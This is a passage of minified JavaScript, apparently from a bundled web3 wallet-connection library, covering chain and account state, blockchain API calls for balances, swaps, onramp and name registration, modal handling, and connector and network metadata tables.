${a.message}`)}}));At.resetWcConnection();const n=r.filter(i=>i.status==="rejected");if(n.length>0)throw new Error(n.map(i=>i.reason.message).join(", "));le.deleteConnectedSocialProvider(),t?Oe.removeConnectorId(t):Oe.resetConnectorIds(),wt.sendEvent({type:"track",event:"DISCONNECT_SUCCESS",properties:{namespace:t||"all"}})}catch(r){console.error(r.message||"Failed to disconnect chains"),wt.sendEvent({type:"track",event:"DISCONNECT_ERROR",properties:{message:r.message||"Failed to disconnect chains"}})}},setIsSwitchingNamespace(t){ce.isSwitchingNamespace=t},getFirstCaipNetworkSupportsAuthConnector(){var r,n;const t=[];let e;if(ce.chains.forEach(i=>{Z.AUTH_CONNECTOR_SUPPORTED_CHAINS.find(s=>s===i.namespace)&&i.namespace&&t.push(i.namespace)}),t.length>0){const i=t[0];return e=i?(n=(r=ce.chains.get(i))==null?void 0:r.caipNetworks)==null?void 0:n[0]:void 0,e}},getAccountData(t){var e;return t?(e=q.state.chains.get(t))==null?void 0:e.accountState:pe.state},getNetworkData(t){var r;const e=t||ce.activeChain;if(e)return(r=q.state.chains.get(e))==null?void 0:r.networkState},getCaipNetworkByNamespace(t,e){var i,s,o;if(!t)return;const r=q.state.chains.get(t),n=(i=r==null?void 0:r.caipNetworks)==null?void 0:i.find(a=>a.id===e);return n||((s=r==null?void 0:r.networkState)==null?void 0:s.caipNetwork)||((o=r==null?void 0:r.caipNetworks)==null?void 0:o[0])},getRequestedCaipNetworkIds(){const t=Oe.state.filterByNamespace;return(t?[ce.chains.get(t)]:Array.from(ce.chains.values())).flatMap(r=>(r==null?void 0:r.caipNetworks)||[]).map(r=>r.caipNetworkId)},getCaipNetworks(t){return t?q.getRequestedCaipNetworks(t):q.getAllRequestedCaipNetworks()}},mq={purchaseCurrencies:[{id:"2b92315d-eab7-5bef-84fa-089a131333f5",name:"USD Coin",symbol:"USDC",networks:[{name:"ethereum-mainnet",display_name:"Ethereum",chain_id:"1",contract_address:"0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"},{name:"polygon-mainnet",display_name:"Polygon",chain_id:"137",contract_address:"0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174"}]},{id:"2b92315d-eab7-5bef-84fa-089a131333f5",name:"Ether",symbol:"ETH",networks:[{name:"ethereum-mainnet",display_name:"Ethereum",chain_id:"1",contract_address:"0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"},{name:"polygon-mainnet",display_name:"Polygon",chain_id:"137",contract_address:"0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174"}]}],paymentCurrencies:[{id:"USD",payment_method_limits:[{id:"card",min:"10.00",max:"7500.00"},{id:"ach_bank_account",min:"10.00",max:"25000.00"}]},{id:"EUR",payment_method_limits:[{id:"card",min:"10.00",max:"7500.00"},{id:"ach_bank_account",min:"10.00",max:"25000.00"}]}]},_2=Ie.getBlockchainApiUrl(),En=Kt({clientId:null,api:new vf({baseUrl:_2,clientId:null}),supportedChains:{http:[],ws:[]}}),_e={state:En,async get(t){const{st:e,sv:r}=_e.getSdkProperties(),n=te.state.projectId,i={...t.params||{},st:e,sv:r,projectId:n};return En.api.get({...t,params:i})},getSdkProperties(){const{sdkType:t,sdkVersion:e}=te.state;return{st:t||"unknown",sv:e||"unknown"}},async isNetworkSupported(t){if(!t)return!1;try{En.supportedChains.http.length||await _e.getSupportedNetworks()}catch{return!1}return En.supportedChains.http.includes(t)},async getSupportedNetworks(){const t=await _e.get({path:"v1/supported-chains"});return En.supportedChains=t,t},async fetchIdentity({address:t,caipNetworkId:e}){if(!await _e.isNetworkSupported(e))return{avatar:"",name:""};const n=le.getIdentityFromCacheForAddress(t);if(n)return n;const i=await _e.get({path:`/v1/identity/${t}`,params:{sender:q.state.activeCaipAddress?Ie.getPlainAddress(q.state.activeCaipAddress):void 0}});return le.updateIdentityCache({address:t,identity:i,timestamp:Date.now()}),i},async fetchTransactions({account:t,cursor:e,onramp:r,signal:n,cache:i,chainId:s}){var a;return await _e.isNetworkSupported((a=q.state.activeCaipNetwork)==null?void 0:a.caipNetworkId)?_e.get({path:`/v1/account/${t}/history`,params:{cursor:e,onramp:r,chainId:s},signal:n,cache:i}):{data:[],next:void 0}},async fetchSwapQuote({amount:t,userAddress:e,from:r,to:n,gasPrice:i}){var o;return await _e.isNetworkSupported((o=q.state.activeCaipNetwork)==null?void 0:o.caipNetworkId)?_e.get({path:"/v1/convert/quotes",headers:{"Content-Type":"application/json"},params:{amount:t,userAddress:e,from:r,to:n,gasPrice:i}}):{quotes:[]}},async fetchSwapTokens({chainId:t}){var r;return await _e.isNetworkSupported((r=q.state.activeCaipNetwork)==null?void 0:r.caipNetworkId)?_e.get({path:"/v1/convert/tokens",params:{chainId:t}}):{tokens:[]}},async fetchTokenPrice({addresses:t}){var r;return await _e.isNetworkSupported((r=q.state.activeCaipNetwork)==null?void 0:r.caipNetworkId)?En.api.post({path:"/v1/fungible/price",body:{currency:"usd",addresses:t,projectId:te.state.projectId},headers:{"Content-Type":"application/json"}}):{fungibles:[]}},async fetchSwapAllowance({tokenAddress:t,userAddress:e}){var n;return await _e.isNetworkSupported((n=q.state.activeCaipNetwork)==null?void 0:n.caipNetworkId)?_e.get({path:"/v1/convert/allowance",params:{tokenAddress:t,userAddress:e},headers:{"Content-Type":"application/json"}}):{allowance:"0"}},async fetchGasPrice({chainId:t}){var i;const{st:e,sv:r}=_e.getSdkProperties();if(!await _e.isNetworkSupported((i=q.state.activeCaipNetwork)==null?void 0:i.caipNetworkId))throw new Error("Network not supported for Gas Price");return _e.get({path:"/v1/convert/gas-price",headers:{"Content-Type":"application/json"},params:{chainId:t,st:e,sv:r}})},async generateSwapCalldata({amount:t,from:e,to:r,userAddress:n,disableEstimate:i}){var o;if(!await _e.isNetworkSupported((o=q.state.activeCaipNetwork)==null?void 0:o.caipNetworkId))throw new Error("Network not supported for Swaps");return En.api.post({path:"/v1/convert/build-transaction",headers:{"Content-Type":"application/json"},body:{amount:t,eip155:{slippage:Ar.CONVERT_SLIPPAGE_TOLERANCE},projectId:te.state.projectId,from:e,to:r,userAddress:n,disableEstimate:i}})},async generateApproveCalldata({from:t,to:e,userAddress:r}){var o;const{st:n,sv:i}=_e.getSdkProperties();if(!await _e.isNetworkSupported((o=q.state.activeCaipNetwork)==null?void 0:o.caipNetworkId))throw new Error("Network not supported for Swaps");return _e.get({path:"/v1/convert/build-approve",headers:{"Content-Type":"application/json"},params:{userAddress:r,from:t,to:e,st:n,sv:i}})},async getBalance(t,e,r){var u;const{st:n,sv:i}=_e.getSdkProperties();if(!await _e.isNetworkSupported((u=q.state.activeCaipNetwork)==null?void 0:u.caipNetworkId))return kr.showError("Token Balance Unavailable"),{balances:[]};const o=`${e}:${t}`,a=le.getBalanceCacheForCaipAddress(o);if(a)return a;const c=await _e.get({path:`/v1/account/${t}/balance`,params:{currency:"usd",chainId:e,forceUpdate:r,st:n,sv:i}});return le.updateBalanceCache({caipAddress:o,balance:c,timestamp:Date.now()}),c},async lookupEnsName(t){var r;return await _e.isNetworkSupported((r=q.state.activeCaipNetwork)==null?void 0:r.caipNetworkId)?_e.get({path:`/v1/profile/account/${t}`,params:{apiVersion:"2"}}):{addresses:{},attributes:[]}},async reverseLookupEnsName({address:t}){var r;return await _e.isNetworkSupported((r=q.state.activeCaipNetwork)==null?void 0:r.caipNetworkId)?_e.get({path:`/v1/profile/reverse/${t}`,params:{sender:pe.state.address,apiVersion:"2"}}):[]},async getEnsNameSuggestions(t){var r;return await _e.isNetworkSupported((r=q.state.activeCaipNetwork)==null?void 0:r.caipNetworkId)?_e.get({path:`/v1/profile/suggestions/${t}`,params:{zone:"reown.id"}}):{suggestions:[]}},async registerEnsName({coinType:t,address:e,message:r,signature:n}){var s;return await _e.isNetworkSupported((s=q.state.activeCaipNetwork)==null?void 0:s.caipNetworkId)?En.api.post({path:"/v1/profile/account",body:{coin_type:t,address:e,message:r,signature:n},headers:{"Content-Type":"application/json"}}):{success:!1}},async generateOnRampURL({destinationWallets:t,partnerUserId:e,defaultNetwork:r,purchaseAmount:n,paymentAmount:i}){var a;return await _e.isNetworkSupported((a=q.state.activeCaipNetwork)==null?void 0:a.caipNetworkId)?(await En.api.post({path:"/v1/generators/onrampurl",params:{projectId:te.state.projectId},body:{destinationWallets:t,defaultNetwork:r,partnerUserId:e,defaultExperience:"buy",presetCryptoAmount:n,presetFiatAmount:i}})).url:""},async getOnrampOptions(){var e;if(!await _e.isNetworkSupported((e=q.state.activeCaipNetwork)==null?void 0:e.caipNetworkId))return{paymentCurrencies:[],purchaseCurrencies:[]};try{return await _e.get({path:"/v1/onramp/options"})}catch{return mq}},async getOnrampQuote({purchaseCurrency:t,paymentCurrency:e,amount:r,network:n}){var i;try{return await _e.isNetworkSupported((i=q.state.activeCaipNetwork)==null?void 0:i.caipNetworkId)?await En.api.post({path:"/v1/onramp/quote",params:{projectId:te.state.projectId},body:{purchaseCurrency:t,paymentCurrency:e,amount:r,network:n}}):null}catch{return{coinbaseFee:{amount:r,currency:e.id},networkFee:{amount:r,currency:e.id},paymentSubtotal:{amount:r,currency:e.id},paymentTotal:{amount:r,currency:e.id},purchaseAmount:{amount:r,currency:e.id},quoteId:"mocked-quote-id"}}},async getSmartSessions(t){var r;return await _e.isNetworkSupported((r=q.state.activeCaipNetwork)==null?void 0:r.caipNetworkId)?_e.get({path:`/v1/sessions/${t}`}):[]},async revokeSmartSession(t,e,r){var i;return await _e.isNetworkSupported((i=q.state.activeCaipNetwork)==null?void 0:i.caipNetworkId)?En.api.post({path:`/v1/sessions/${t}/revoke`,params:{projectId:te.state.projectId},body:{pci:e,signature:r}}):{success:!1}},setClientId(t){En.clientId=t,En.api=new vf({baseUrl:_2,clientId:t})}},Un=Kt({currentTab:0,tokenBalance:[],smartAccountDeployed:!1,addressLabels:new Map,allAccounts:[]}),pe={state:Un,replaceState(t){t&&Object.assign(Un,Jo(t))},subscribe(t){return q.subscribeChainProp("accountState",e=>{if(e)return t(e)})},subscribeKey(t,e,r){let n;return q.subscribeChainProp("accountState",i=>{if(i){const s=i[t];n!==s&&(n=s,e(s))}},r)},setStatus(t,e){q.setAccountProp("status",t,e)},getCaipAddress(t){return q.getAccountProp("caipAddress",t)},setCaipAddress(t,e){const r=t?Ie.getPlainAddress(t):void 0;e===q.state.activeChain&&(q.state.activeCaipAddress=t),q.setAccountProp("caipAddress",t,e),q.setAccountProp("address",r,e)},setBalance(t,e,r){q.setAccountProp("balance",t,r),q.setAccountProp("balanceSymbol",e,r)},setProfileName(t,e){q.setAccountProp("profileName",t,e)},setProfileImage(t,e){q.setAccountProp("profileImage",t,e)},setUser(t,e){q.setAccountProp("user",t,e)},setAddressExplorerUrl(t,e){q.setAccountProp("addressExplorerUrl",t,e)},setSmartAccountDeployed(t,e){q.setAccountProp("smartAccountDeployed",t,e)},setCurrentTab(t){q.setAccountProp("currentTab",t,q.state.activeChain)},setTokenBalance(t,e){t&&q.setAccountProp("tokenBalance",t,e)},setShouldUpdateToAddress(t,e){q.setAccountProp("shouldUpdateToAddress",t,e)},setAllAccounts(t,e){q.setAccountProp("allAccounts",t,e)},addAddressLabel(t,e,r){const n=q.getAccountProp("addressLabels",r)||new Map;n.set(t,e),q.setAccountProp("addressLabels",n,r)},removeAddressLabel(t,e){const r=q.getAccountProp("addressLabels",e)||new Map;r.delete(t),q.setAccountProp("addressLabels",r,e)},setConnectedWalletInfo(t,e){q.setAccountProp("connectedWalletInfo",t,e,!1)},setPreferredAccountType(t,e){q.setAccountProp("preferredAccountTypes",{...Un.preferredAccountTypes,[e]:t},e)},setPreferredAccountTypes(t){Un.preferredAccountTypes=t},setSocialProvider(t,e){t&&q.setAccountProp("socialProvider",t,e)},setSocialWindow(t,e){q.setAccountProp("socialWindow",t?Jo(t):void 0,e)},setFarcasterUrl(t,e){q.setAccountProp("farcasterUrl",t,e)},async fetchTokenBalance(t){var s,o;Un.balanceLoading=!0;const e=(s=q.state.activeCaipNetwork)==null?void 0:s.caipNetworkId,r=(o=q.state.activeCaipNetwork)==null?void 0:o.chainNamespace,n=q.state.activeCaipAddress,i=n?Ie.getPlainAddress(n):void 0;if(Un.lastRetry&&!Ie.isAllowedRetry(Un.lastRetry,30*Ar.ONE_SEC_MS))return Un.balanceLoading=!1,[];try{if(i&&e&&r){const c=(await _e.getBalance(i,e)).balances.filter(u=>u.quantity.decimals!=="0");return this.setTokenBalance(c,r),Un.lastRetry=void 0,Un.balanceLoading=!1,c}}catch(a){Un.lastRetry=Date.now(),t==null||t(a),kr.showError("Token Balance Unavailable")}finally{Un.balanceLoading=!1}return[]},resetAccount(t){q.resetAccount(t)}},sn=Kt({loading:!1,loadingNamespaceMap:new Map,open:!1,shake:!1,namespace:void 0}),nr={state:sn,subscribe(t){return Xr(sn,()=>t(sn))},subscribeKey(t,e){return tn(sn,t,e)},async open(t){var i;const e=pe.state.status==="connected";At.state.wcBasic?xe.prefetch({fetchNetworkImages:!1,fetchConnectorImages:!1}):await xe.prefetch({fetchConnectorImages:!e,fetchFeaturedWallets:!e,fetchRecommendedWallets:!e}),t!=null&&t.namespace?(await q.switchActiveNamespace(t.namespace),nr.setLoading(!0,t.namespace)):nr.setLoading(!0),Oe.setFilterByNamespace(t==null?void 0:t.namespace);const r=(i=q.getAccountData(t==null?void 0:t.namespace))==null?void 0:i.caipAddress;q.state.noAdapters&&!r?Ie.isMobile()?at.reset("AllWallets"):at.reset("ConnectingWalletConnectBasic"):t!=null&&t.view?at.reset(t.view,t.data):r?at.reset("Account"):at.reset("Connect"),sn.open=!0,$i.set({open:!0}),wt.sendEvent({type:"track",event:"MODAL_OPEN",properties:{connected:!!r}})},close(){const t=te.state.enableEmbedded,e=!!q.state.activeCaipAddress;sn.open&&wt.sendEvent({type:"track",event:"MODAL_CLOSE",properties:{connected:e}}),sn.open=!1,nr.clearLoading(),t?e?at.replace("Account"):at.push("Connect"):$i.set({open:!1}),At.resetUri()},setLoading(t,e){e&&sn.loadingNamespaceMap.set(e,t),sn.loading=t,$i.set({loading:t})},clearLoading(){sn.loadingNamespaceMap.clear(),sn.loading=!1},shake(){sn.shake||(sn.shake=!0,setTimeout(()=>{sn.shake=!1},500))}},UE=2147483648,yq={convertEVMChainIdToCoinType(t){if(t>=UE)throw new Error("Invalid chainId");return(UE|t)>>>0}},$n=Kt({suggestions:[],loading:!1}),C2={state:$n,subscribe(t){return Xr($n,()=>t($n))},subscribeKey(t,e){return tn($n,t,e)},async resolveName(t){var e,r;try{return await _e.lookupEnsName(t)}catch(n){const i=n;throw new Error(((r=(e=i==null?void 0:i.reasons)==null?void 0:e[0])==null?void 0:r.description)||"Error resolving name")}},async isNameRegistered(t){try{return await _e.lookupEnsName(t),!0}catch{return!1}},async getSuggestions(t){try{$n.loading=!0,$n.suggestions=[];const e=await _e.getEnsNameSuggestions(t);return $n.suggestions=e.suggestions.map(r=>({...r,name:r.name}))||[],$n.suggestions}catch(e){const r=this.parseEnsApiError(e,"Error fetching name suggestions");throw new Error(r)}finally{$n.loading=!1}},async getNamesForAddress(t){try{if(!q.state.activeCaipNetwork)return[];const r=le.getEnsFromCacheForAddress(t);if(r)return r;const n=await _e.reverseLookupEnsName({address:t});return le.updateEnsCache({address:t,ens:n,timestamp:Date.now()}),n}catch(e){const r=this.parseEnsApiError(e,"Error fetching names for address");throw new Error(r)}},async registerName(t){const e=q.state.activeCaipNetwork;if(!e)throw new Error("Network not found");const r=pe.state.address,n=Oe.getAuthConnector();if(!r||!n)throw new Error("Address or auth connector not found");$n.loading=!0;try{const i=JSON.stringify({name:t,attributes:{},timestamp:Math.floor(Date.now()/1e3)});at.pushTransactionStack({view:"RegisterAccountNameSuccess",goBack:!1,replace:!0,onCancel(){$n.loading=!1}});const s=await At.signMessage(i),o=e.id;if(!o)throw new Error("Network not found");const a=yq.convertEVMChainIdToCoinType(Number(o));await _e.registerEnsName({coinType:a,address:r,signature:s,message:i}),pe.setProfileName(t,e.chainNamespace),at.replace("RegisterAccountNameSuccess")}catch(i){const s=this.parseEnsApiError(i,`Error registering name ${t}`);throw at.replace("RegisterAccountName"),new Error(s)}finally{$n.loading=!1}},validateName(t){return/^[a-zA-Z0-9-]{4,}$/u.test(t)},parseEnsApiError(t,e){var n,i;const r=t;return((i=(n=r==null?void 0:r.reasons)==null?void 0:n[0])==null?void 0:i.description)||e}},Gt={METMASK_CONNECTOR_NAME:"MetaMask",TRUST_CONNECTOR_NAME:"Trust Wallet",SOLFLARE_CONNECTOR_NAME:"Solflare",PHANTOM_CONNECTOR_NAME:"Phantom",COIN98_CONNECTOR_NAME:"Coin98",MAGIC_EDEN_CONNECTOR_NAME:"Magic Eden",BACKPACK_CONNECTOR_NAME:"Backpack",BITGET_CONNECTOR_NAME:"Bitget Wallet",FRONTIER_CONNECTOR_NAME:"Frontier",XVERSE_CONNECTOR_NAME:"Xverse Wallet",LEATHER_CONNECTOR_NAME:"Leather",EIP155:"eip155",ADD_CHAIN_METHOD:"wallet_addEthereumChain",EIP6963_ANNOUNCE_EVENT:"eip6963:announceProvider",EIP6963_REQUEST_EVENT:"eip6963:requestProvider",CONNECTOR_RDNS_MAP:{coinbaseWallet:"com.coinbase.wallet",coinbaseWalletSDK:"com.coinbase.wallet"},CONNECTOR_TYPE_EXTERNAL:"EXTERNAL",CONNECTOR_TYPE_WALLET_CONNECT:"WALLET_CONNECT",CONNECTOR_TYPE_INJECTED:"INJECTED",CONNECTOR_TYPE_ANNOUNCED:"ANNOUNCED",CONNECTOR_TYPE_AUTH:"AUTH",CONNECTOR_TYPE_MULTI_CHAIN:"MULTI_CHAIN",CONNECTOR_TYPE_W3M_AUTH:"ID_AUTH"},Qs={ConnectorExplorerIds:{[Z.CONNECTOR_ID.COINBASE]:"fd20dc426fb37566d803205b19bbc1d4096b248ac04548e3cfb6b3a38bd033aa",[Z.CONNECTOR_ID.COINBASE_SDK]:"fd20dc426fb37566d803205b19bbc1d4096b248ac04548e3cfb6b3a38bd033aa",[Z.CONNECTOR_ID.SAFE]:"225affb176778569276e484e1b92637ad061b01e13a048b35a9d280c3b58970f",[Z.CONNECTOR_ID.LEDGER]:"19177a98252e07ddfc9af2083ba8e07ef627cb6103467ffebb3f8f4205fd7927",[Z.CONNECTOR_ID.OKX]:"971e689d0a5be527bac79629b4ee9b925e82208e5168b733496a09c0faed0709",[Gt.METMASK_CONNECTOR_NAME]:"c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96",[Gt.TRUST_CONNECTOR_NAME]:"4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0",[Gt.SOLFLARE_CONNECTOR_NAME]:"1ca0bdd4747578705b1939af023d120677c64fe6ca76add81fda36e350605e79",[Gt.PHANTOM_CONNECTOR_NAME]:"a797aa35c0fadbfc1a53e7f675162ed5226968b44a19ee3d24385c64d1d3c393",[Gt.COIN98_CONNECTOR_NAME]:"2a3c89040ac3b723a1972a33a125b1db11e258a6975d3a61252cd64e6ea5ea01",[Gt.MAGIC_EDEN_CONNECTOR_NAME]:"8b830a2b724a9c3fbab63af6f55ed29c9dfa8a55e732dc88c80a196a2ba136c6",[Gt.BACKPACK_CONNECTOR_NAME]:"2bd8c14e035c2d48f184aaa168559e86b0e3433228d3c4075900a221785019b0",[Gt.BITGET_CONNECTOR_NAME]:"38f5d18bd8522c244bdd70cb4a68e0e718865155811c043f052fb9f1c51de662",[Gt.FRONTIER_CONNECTOR_NAME]:"85db431492aa2e8672e93f4ea7acf10c88b97b867b0d373107af63dc4880f041",[Gt.XVERSE_CONNECTOR_NAME]:"2a87d74ae02e10bdd1f51f7ce6c4e1cc53cd5f2c0b6b5ad0d7b3007d2b13de7b",[Gt.LEATHER_CONNECTOR_NAME]:"483afe1df1df63daf313109971ff3ef8356ddf1cc4e45877d205eee0b7893a13"},NetworkImageIds:{1:"ba0ba0cd-17c6-4806-ad93-f9d174f17900",42161:"3bff954d-5cb0-47a0-9a23-d20192e74600",43114:"30c46e53-e989-45fb-4549-be3bd4eb3b00",56:"93564157-2e8e-4ce7-81df-b264dbee9b00",250:"06b26297-fe0c-4733-5d6b-ffa5498aac00",10:"ab9c186a-c52f-464b-2906-ca59d760a400",137:"41d04d42-da3b-4453-8506-668cc0727900",5e3:"e86fae9b-b770-4eea-e520-150e12c81100",295:"6a97d510-cac8-4e58-c7ce-e8681b044c00",11155111:"e909ea0a-f92a-4512-c8fc-748044ea6800",84532:"a18a7ecd-e307-4360-4746-283182228e00",1301:"4eeea7ef-0014-4649-5d1d-07271a80f600",130:"2257980a-3463-48c6-cbac-a42d2a956e00",10143:"0a728e83-bacb-46db-7844-948f05434900",100:"02b53f6a-e3d4-479e-1cb4-21178987d100",9001:"f926ff41-260d-4028-635e-91913fc28e00",324:"b310f07f-4ef7-49f3-7073-2a0a39685800",314:"5a73b3dd-af74-424e-cae0-0de859ee9400",4689:"34e68754-e536-40da-c153-6ef2e7188a00",1088:"3897a66d-40b9-4833-162f-a2c90531c900",1284:"161038da-44ae-4ec7-1208-0ea569454b00",1285:"f1d73bb6-5450-4e18-38f7-fb6484264a00",7777777:"845c60df-d429-4991-e687-91ae45791600",42220:"ab781bbc-ccc6-418d-d32d-789b15da1f00",8453:"7289c336-3981-4081-c5f4-efc26ac64a00",1313161554:"3ff73439-a619-4894-9262-4470c773a100",2020:"b8101fc0-9c19-4b6f-ec65-f6dfff106e00",2021:"b8101fc0-9c19-4b6f-ec65-f6dfff106e00",80094:"e329c2c9-59b0-4a02-83e4-212ff3779900",2741:"fc2427d1-5af9-4a9c-8da5-6f94627cd900","5eykt4UsFv8P8NJdTREpY1vzqKqZKvdp":"a1b58899-f671-4276-6a5e-56ca5bd59700","4uhcVJyU9pJkvQyS88uRDiswHXSCkY3z":"a1b58899-f671-4276-6a5e-56ca5bd59700",EtWTRABZaYq6iMfeYKouRu166VU2xqa1:"a1b58899-f671-4276-6a5e-56ca5bd59700","000000000019d6689c085ae165831e93":"0b4838db-0161-4ffe-022d-532bf03dba00","000000000933ea01ad0ee984209779ba":"39354064-d79b-420b-065d-f980c4b78200"},ConnectorImageIds:{[Z.CONNECTOR_ID.COINBASE]:"0c2840c3-5b04-4c44-9661-fbd4b49e1800",[Z.CONNECTOR_ID.COINBASE_SDK]:"0c2840c3-5b04-4c44-9661-fbd4b49e1800",[Z.CONNECTOR_ID.SAFE]:"461db637-8616-43ce-035a-d89b8a1d5800",[Z.CONNECTOR_ID.LEDGER]:"54a1aa77-d202-4f8d-0fb2-5d2bb6db0300",[Z.CONNECTOR_ID.WALLET_CONNECT]:"ef1a1fcf-7fe8-4d69-bd6d-fda1345b4400",[Z.CONNECTOR_ID.INJECTED]:"07ba87ed-43aa-4adf-4540-9e6a2b9cae00"},ConnectorNamesMap:{[Z.CONNECTOR_ID.INJECTED]:"Browser Wallet",[Z.CONNECTOR_ID.WALLET_CONNECT]:"WalletConnect",[Z.CONNECTOR_ID.COINBASE]:"Coinbase",[Z.CONNECTOR_ID.COINBASE_SDK]:"Coinbase",[Z.CONNECTOR_ID.LEDGER]:"Ledger",[Z.CONNECTOR_ID.SAFE]:"Safe"},ConnectorTypesMap:{[Z.CONNECTOR_ID.INJECTED]:"INJECTED",[Z.CONNECTOR_ID.WALLET_CONNECT]:"WALLET_CONNECT",[Z.CONNECTOR_ID.EIP6963]:"ANNOUNCED",[Z.CONNECTOR_ID.AUTH]:"AUTH"}},Vf={getCaipTokens(t){if(!t)return;const e={};return Object.entries(t).forEach(([r,n])=>{e[`${Gt.EIP155}:${r}`]=n}),e},isLowerCaseMatch(t,e){return(t==null?void 0:t.toLowerCase())===(e==null?void 0:e.toLowerCase())}},qo={UniversalProviderErrors:{UNAUTHORIZED_DOMAIN_NOT_ALLOWED:{message:"Unauthorized: origin not allowed",alertErrorKey:"INVALID_APP_CONFIGURATION"},JWT_VALIDATION_ERROR:{message:"JWT validation error: JWT Token is not yet valid",alertErrorKey:"JWT_TOKEN_NOT_VALID"},INVALID_KEY:{message:"Unauthorized: invalid key",alertErrorKey:"INVALID_PROJECT_ID"}},ALERT_ERRORS:{SWITCH_NETWORK_NOT_FOUND:{shortMessage:"Network Not Found",longMessage:"Network not found - please make sure it is included in 'networks' array in createAppKit function"},INVALID_APP_CONFIGURATION:{shortMessage:"Invalid App Configuration",longMessage:()=>`Origin ${wq()?window.origin:"unknown"} not found on Allowlist - update configuration on cloud.reown.com`},SOCIALS_TIMEOUT:{shortMessage:"Invalid App Configuration",longMessage:()=>"There was an issue loading the embedded wallet. Please verify that your domain is allowed at cloud.reown.com"},JWT_TOKEN_NOT_VALID:{shortMessage:"Session Expired",longMessage:"Invalid session found on UniversalProvider - please check your time settings and connect again"},INVALID_PROJECT_ID:{shortMessage:"Invalid App Configuration",longMessage:"Invalid Project ID - update configuration"},PROJECT_ID_NOT_CONFIGURED:{shortMessage:"Project ID Not Configured",longMessage:"Project ID Not Configured - update configuration on cloud.reown.com"}}};function wq(){return typeof window<"u"}const bq={createLogger(t,e="error"){const r=Dc({level:e}),{logger:n}=G0({opts:r});return n.error=(...i)=>{for(const s of i)if(s instanceof Error){t(s,...i);return}t(void 0,...i)},n}},vq="rpc.walletconnect.org";function $E(t,e){const r=new URL("https://rpc.walletconnect.org/v1/");return r.searchParams.set("chainId",t),r.searchParams.set("projectId",e),r.toString()}const Pg=["near:mainnet","solana:5eykt4UsFv8P8NJdTREpY1vzqKqZKvdp","eip155:1101","eip155:56","eip155:42161","eip155:7777777","eip155:59144","eip155:324","solana:EtWTRABZaYq6iMfeYKouRu166VU2xqa1","eip155:5000","solana:4sgjmw1sunhzsxgspuhpqldx6wiyjntz","eip155:80084","eip155:5003","eip155:100","eip155:8453","eip155:42220","eip155:1313161555","eip155:17000","eip155:1","eip155:300","eip155:1313161554","eip155:1329","eip155:84532","eip155:421614","eip155:11155111","eip155:8217","eip155:43114","solana:4uhcVJyU9pJkvQyS88uRDiswHXSCkY3z","eip155:999999999","eip155:11155420","eip155:80002","eip155:97","eip155:43113","eip155:137","eip155:10","eip155:1301","bip122:000000000019d6689c085ae165831e93","bip122:000000000933ea01ad0ee984209779ba"],ki={extendRpcUrlWithProjectId(t,e){let r=!1;try{r=new URL(t).host===vq}catch{r=!1}if(r){const n=new URL(t);return n.searchParams.has("projectId")||n.searchParams.set("projectId",e),n.toString()}return t},isCaipNetwork(t){return"chainNamespace"in t&&"caipNetworkId"in t},getChainNamespace(t){return this.isCaipNetwork(t)?t.chainNamespace:Z.CHAIN.EVM},getCaipNetworkId(t){return this.isCaipNetwork(t)?t.caipNetworkId:`${Z.CHAIN.EVM}:${t.id}`},getDefaultRpcUrl(t,e,r){var i,s,o;const n=(o=(s=(i=t.rpcUrls)==null?void 0:i.default)==null?void 0:s.http)==null?void 0:o[0];return Pg.includes(e)?$E(e,r):n||""},extendCaipNetwork(t,{customNetworkImageUrls:e,projectId:r,customRpcUrls:n}){var d,g,y,m,b;const i=this.getChainNamespace(t),s=this.getCaipNetworkId(t),o=(d=t.rpcUrls.default.http)==null?void 0:d[0],a=this.getDefaultRpcUrl(t,s,r),c=((m=(y=(g=t==null?void 0:t.rpcUrls)==null?void 0:g.chainDefault)==null?void 0:y.http)==null?void 0:m[0])||o,u=((b=n==null?void 0:n[s])==null?void 0:b.map(A=>A.url))||[],l=[...u,a],h=[...u];return c&&!h.includes(c)&&h.push(c),{...t,chainNamespace:i,caipNetworkId:s,assets:{imageId:Qs.NetworkImageIds[t.id],imageUrl:e==null?void 0:e[t.id]},rpcUrls:{...t.rpcUrls,default:{http:l},chainDefault:{http:h}}}},extendCaipNetworks(t,{customNetworkImageUrls:e,projectId:r,customRpcUrls:n}){return t.map(i=>ki.extendCaipNetwork(i,{customNetworkImageUrls:e,customRpcUrls:n,projectId:r}))},getViemTransport(t,e,r){var i,s,o;const n=[];return r==null||r.forEach(a=>{n.push(Hh(a.url,a.config))}),Pg.includes(t.caipNetworkId)&&n.push(Hh($E(t.caipNetworkId,e),{fetchOptions:{headers:{"Content-Type":"text/plain"}}})),(o=(s=(i=t==null?void 0:t.rpcUrls)==null?void 0:i.default)==null?void 0:s.http)==null||o.forEach(a=>{n.push(Hh(a))}),PE(n)},extendWagmiTransports(t,e,r){if(Pg.includes(t.caipNetworkId)){const n=this.getDefaultRpcUrl(t,t.caipNetworkId,e);return PE([r,Hh(n)])}return r},getUnsupportedNetwork(t){return{id:t.split(":")[1],caipNetworkId:t,name:Z.UNSUPPORTED_NETWORK_NAME,chainNamespace:t.split(":")[0],nativeCurrency:{name:"",decimals:0,symbol:""},rpcUrls:{default:{http:[]}}}},getCaipNetworkFromStorage(t){var c;const e=le.getActiveCaipNetworkId(),r=q.getAllRequestedCaipNetworks(),n=Array.from(((c=q.state.chains)==null?void 0:c.keys())||[]),i=e==null?void 0:e.split(":")[0],s=i?n.includes(i):!1,o=r==null?void 0:r.find(u=>u.caipNetworkId===e);return s&&!o&&e?this.getUnsupportedNetwork(e):o||t||(r==null?void 0:r[0])}},Hd={eip155:void 0,solana:void 0,polkadot:void 0,bip122:void 0},on=Kt({providers:{...Hd},providerIds:{...Hd}}),lt={state:on,subscribeKey(t,e){return tn(on,t,e)},subscribe(t){return Xr(on,()=>{t(on)})},subscribeProviders(t){return Xr(on.providers,()=>t(on.providers))},setProvider(t,e){e&&(on.providers[t]=Jo(e))},getProvider(t){return on.providers[t]},setProviderId(t,e){e&&(on.providerIds[t]=e)},getProviderId(t){if(t)return on.providerIds[t]},reset(){on.providers={...Hd},on.providerIds={...Hd}},resetChain(t){on.providers[t]=void 0,on.providerIds[t]=void 